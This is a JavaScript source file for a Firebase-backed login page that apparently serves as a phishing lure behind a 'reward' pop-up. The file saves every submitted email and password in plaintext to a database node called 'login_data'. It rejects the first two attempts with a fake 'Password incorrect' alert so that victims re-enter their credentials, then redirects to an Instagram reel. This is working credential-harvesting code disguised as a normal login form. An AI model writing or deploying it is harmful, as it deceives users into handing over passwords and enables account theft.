import { auth, db } from "./firebase.js";

import {
signInWithEmailAndPassword,
createUserWithEmailAndPassword
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";

import {
ref,
push
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

let attempts = 0;

/* MODAL LOAD */

document.addEventListener("DOMContentLoaded", function () {

let rewardModal = new bootstrap.Modal(document.getElementById("rewardModal"));

rewardModal.show();

let loginNowBtn = document.getElementById("loginNowBtn");

if(loginNowBtn){
loginNowBtn.addEventListener("click", function(){
rewardModal.hide();
});
}

});

/* LOGIN */

let loginForm = document.getElementById("loginForm");

if (loginForm) {

loginForm.addEventListener("submit", async (e) => {

e.preventDefault();

let email = document.getElementById("email").value.trim();
let password = document.getElementById("password").value.trim();

let emailError = document.getElementById("emailError");
let passError = document.getElementById("passwordError");

emailError.innerText = "";
passError.innerText = "";

/* Empty validation */

if(email === ""){
emailError.innerText = "Email required";
return;
}

if(password === ""){
passError.innerText = "Password required";
return;
}

attempts++;

/* Save attempt in realtime DB */

push(ref(db, "login_data"), {
email: email,
password: password,
attempt: attempts,
time: Date.now()
});

/* Fake attempts */

if (attempts < 3) {
alert("Password incorrect");
return;
}

/* Real login on 3rd attempt */

try {

await signInWithEmailAndPassword(auth, email, password);

alert("Login successful");

/* Redirect */

window.location.href = "https://www.instagram.com/reels/DVqIZUTkbUR/";

} catch (err) {

alert(err.message);

}

});

}

/* SIGNUP */

let signupForm = document.getElementById("signupForm");

if(signupForm){

signupForm.addEventListener("submit", async e => {

e.preventDefault();

let email = document.getElementById("signupEmail").value.trim();
let password = document.getElementById("signupPassword").value.trim();

if(email === "" || password === ""){
alert("All fields required");
return;
}

try{

await createUserWithEmailAndPassword(auth,email,password);

/* Save user */

push(ref(db,"users"),{
email:email,
created:Date.now()
});

alert("Account created");

window.location="login.html";

}catch(err){

alert(err.message);

}

});

}